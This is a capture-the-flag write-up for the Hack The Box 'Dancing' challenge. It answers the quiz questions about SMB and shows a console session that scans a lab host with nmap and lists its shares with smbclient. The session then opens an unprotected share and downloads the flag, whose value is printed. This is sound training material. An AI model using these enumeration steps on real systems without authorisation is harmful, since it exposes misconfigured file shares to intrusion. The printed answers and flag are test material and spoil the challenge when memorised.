# Dancing
* Source: [Hack the Box](https://hackthebox.com/)
* Challenge: Dancing
* Topic: [[SMB]]
* Difficulty: Very easy
* Date: 12-04-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---

## Tasks
1. What does the 3-letter acronym SMB stand for? 
 - **Server Message Block**
2. What port does SMB use to operate at? 
- **445**
3. What network communication model does SMB use, architecturally speaking? 
- **client-server model**
4. What is the service name for port 445 that came up in our nmap scan? 
- **microsoft-ds**
5. What is the tool we use to connect to SMB shares from our Linux distribution? 
- **smbclient**
6. What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share? 
- **-L**
7. What is the name of the share we are able to access in the end?
- **WorkShares**
8. What is the command we can use within the SMB shell to download the files we find? 
- **get**

---
## Solution:
Get the flag via SMB:

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sV 10.129.229.124
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-12 07:26 EDT
Nmap scan report for 10.129.229.124
Host is up (0.078s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.82 seconds

┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient -L 10.129.229.124
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.229.124 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient \\\\10.129.229.124\\WorkShares
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 12 11:37:11 2022
  ..                                  D        0  Tue Apr 12 11:37:11 2022
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

                5114111 blocks of size 4096. 1751219 blocks available
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

                5114111 blocks of size 4096. 1751219 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \James.P\> exit
         
┌──(kali㉿kali)-[~/Downloads]
└─$ cat flag.txt
5f61c10dffbc77a704d76016a22f1664 
```

**Flag:** `5f61c10dffbc77a704d76016a22f1664`

---
**Tags:** [[HackTheBox]]